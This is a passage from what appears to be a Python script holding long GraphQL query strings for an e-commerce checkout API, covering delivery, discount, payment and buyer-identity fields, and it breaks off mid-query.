OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}

"""

# PASTE QUERY_PROPOSAL_DELIVERY HERE  
QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode 